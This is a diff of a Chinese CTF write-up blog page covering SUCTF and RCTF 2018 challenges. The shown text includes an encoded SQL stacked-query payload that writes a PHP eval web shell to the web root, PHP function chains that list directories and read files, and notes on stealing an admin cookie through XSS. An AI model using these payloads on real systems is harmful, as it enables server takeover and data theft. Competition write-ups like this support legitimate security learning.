@@ -93,17 +93,17 @@
 
 
 
-<meta name="description" content="周末做了点">
+<meta name="description" content="周末做了点su rctf的当时没看 整理下">
 <meta name="keywords">
 <meta property="og:type" content="article">
 <meta property="og:title" content="suctfwp">
 <meta property="og:url" content="http://Merl1ng.com/2018/05/28/suctfwp/index.html">
 <meta property="og:site_name" content="Merl1ng's blog">
-<meta property="og:description" content="周末做了点">
-<meta property="og:updated_time" content="2018-05-29T14:36:17.707Z">
+<meta property="og:description" content="周末做了点su rctf的当时没看 整理下">
+<meta property="og:updated_time" content="2018-05-31T14:20:15.855Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="suctfwp">
-<meta name="twitter:description" content="周末做了点">
+<meta name="twitter:description" content="周末做了点su rctf的当时没看 整理下">
 
 
 
@@ -330,9 +330,9 @@
       
 
       
-        <p>周末做了点</p>
+        <p>周末做了点su rctf的当时没看 整理下</p>
 <a id="more"></a>
-<h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><p>php匿名函数</p>
+<h2 id="suctf"><a href="#suctf" class="headerlink" title="suctf"></a>suctf</h2><h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><p>php匿名函数</p>
 <p><a href="https://www.jianshu.com/p/19e3ee990cb7" target="_blank" rel="external">https://www.jianshu.com/p/19e3ee990cb7</a></p>
 <p>hitcon的简化</p>
 <p>除此之外匿名函数还有一个攻击点</p>
@@ -343,6 +343,7 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(<span class="variable">$contents</span>=file_get_contents(<span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>]))&#123;</div><div class="line">    <span class="variable">$data</span>=substr(<span class="variable">$contents</span>,5);</div><div class="line">    foreach (<span class="variable">$black_char</span> as <span class="variable">$b</span>) &#123;</div><div class="line">        <span class="keyword">if</span> (stripos(<span class="variable">$data</span>, <span class="variable">$b</span>) !== <span class="literal">false</span>)&#123;</div><div class="line">            die(<span class="string">"illegal char"</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;     </div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <p>意思是从第六个字符起开始过滤</p>
 <p>得先fuzz看下哪些没在黑名单里面</p>
+<p>然后构造webshell</p>
 <h3 id="MultiSql"><a href="#MultiSql" class="headerlink" title="MultiSql"></a>MultiSql</h3><p>首先盲注拿到root用户</p>
 <p>然后 load_file注入看文件</p>
 <p>读 user.php 发现是用mysqli_multi_query()函数来进行sql语句查询的 可以多语句执行</p>
@@ -352,8 +353,8 @@
 <p>select 0x3c3f706870206576616c28245f524551554553545b273535333332275d293b3f3e into outfile ‘/var/www/html/favicon/wfox.php’</p>
 <p>再hex编码</p>
 <p>set @num=0x73656c65637420307833633366373036383730323036353736363136633238323435663532343535313535343535333534356232373335333533333333333232373564323933623366336520696e746f206f757466696c6520272f7661722f7777772f68746d6c2f66617669636f6e2f77666f782e70687027;prepare t from @num;execute t;</p>
-<h3 id="homework"><a href="#homework" class="headerlink" title="homework"></a>homework</h3><p>挺难的 但其实也没有超出知识体系 xxe和sql</p>
-<p>但还是太菜了不会做</p>
+<h3 id="homework"><a href="#homework" class="headerlink" title="homework"></a>homework</h3><p>挺难的 但其实部分也没有超出知识体系 xxe和sql没想起来不应该</p>
+<h3 id="misc0"><a href="#misc0" class="headerlink" title="misc0"></a>misc0</h3><p>base32 转ascii</p>
 <h3 id="misc1"><a href="#misc1" class="headerlink" title="misc1"></a>misc1</h3><p>x%a1=b1<br>……<br>x%a2=b20</p>
 <p>求x</p>
 <p>写python半自动跑了下</p>
@@ -361,6 +362,17 @@
 <p>每求两个再加的时候就加上这两个的最小公倍数</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">x=103326966496273637783027077789967039569697458403</div><div class="line"><span class="keyword">while</span> (x &lt; 1000000000000000000000000000000000000000000000000000000000000000000000000000):</div><div class="line">    <span class="built_in">print</span> x</div><div class="line">    <span class="keyword">if</span>(x%373==4):</div><div class="line">       <span class="built_in">print</span> x;</div><div class="line">       <span class="built_in">break</span></div><div class="line">    x =x+257*263*269*271*277*281*283*293*307*311*313*317*331*337*347*349*353*359*367</div></pre></td></tr></table></figure>
 <p>最后得到一串贼长的 转16进制再转ascii码</p>
+<h2 id="rctf2018"><a href="#rctf2018" class="headerlink" title="rctf2018"></a>rctf2018</h2><p><a href="https://xz.aliyun.com/t/2347" target="_blank" rel="external">https://xz.aliyun.com/t/2347</a></p>
+<p><a href="https://lorexxar.cn/2018/05/23/rctf2018/#r-cursive" target="_blank" rel="external">https://lorexxar.cn/2018/05/23/rctf2018/#r-cursive</a></p>
+<h3 id="web-amp"><a href="#web-amp" class="headerlink" title="web  amp"></a>web  amp</h3><p>cookie提示flag在admin的cookie 应该是xss</p>
+<p>猜测使用AMP特性绕过csp打到cookie</p>
+<p><a href="https://github.com/ampproject/amphtml/blob/master/spec/amp-var-substitutions.md#client-id" target="_blank" rel="external">https://github.com/ampproject/amphtml/blob/master/spec/amp-var-substitutions.md#client-id</a></p>
+<h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><p>可以递归执行函数，不允许带参数<br>?cmd=print(readdir(opendir(getcwd()))); 可以列目录<br>?cmd=print(readfile(readdir(opendir(getcwd())))); 读文件<br>?cmd=print(dirname(dirname(getcwd()))); print出/var/www</p>
+<h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><p>binwalk发现红酒图片</p>
+<p>wine</p>
+<h3 id="misc-git"><a href="#misc-git" class="headerlink" title="misc git"></a>misc git</h3><p>git revert</p>
+<h3 id="misc-Number-Game"><a href="#misc-Number-Game" class="headerlink" title="misc Number Game"></a>misc Number Game</h3><p>GITHUB搜一搜 </p>
+<p><a href="https://github.com/AustinGuo/GessNumber" target="_blank" rel="external">https://github.com/AustinGuo/GessNumber</a></p>
 
       
     </div>
@@ -555,7 +567,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#web1"><span class="nav-number">1.</span> <span class="nav-text">web1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web2"><span class="nav-number">2.</span> <span class="nav-text">web2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MultiSql"><span class="nav-number">3.</span> <span class="nav-text">MultiSql</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#homework"><span class="nav-number">4.</span> <span class="nav-text">homework</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#misc1"><span class="nav-number">5.</span> <span class="nav-text">misc1</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#suctf"><span class="nav-number">1.</span> <span class="nav-text">suctf</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#web1"><span class="nav-number">1.1.</span> <span class="nav-text">web1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web2"><span class="nav-number">1.2.</span> <span class="nav-text">web2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MultiSql"><span class="nav-number">1.3.</span> <span class="nav-text">MultiSql</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#homework"><span class="nav-number">1.4.</span> <span class="nav-text">homework</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#misc0"><span class="nav-number">1.5.</span> <span class="nav-text">misc0</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#misc1"><span class="nav-number">1.6.</span> <span class="nav-text">misc1</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#rctf2018"><span class="nav-number">2.</span> <span class="nav-text">rctf2018</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#web-amp"><span class="nav-number">2.1.</span> <span class="nav-text">web  amp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web"><span class="nav-number">2.2.</span> <span class="nav-text">web</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#misc"><span class="nav-number">2.3.</span> <span class="nav-text">misc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#misc-git"><span class="nav-number">2.4.</span> <span class="nav-text">misc git</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#misc-Number-Game"><span class="nav-number">2.5.</span> <span class="nav-text">misc Number Game</span></a></li></ol></li></ol></div>
             
 
           </div>
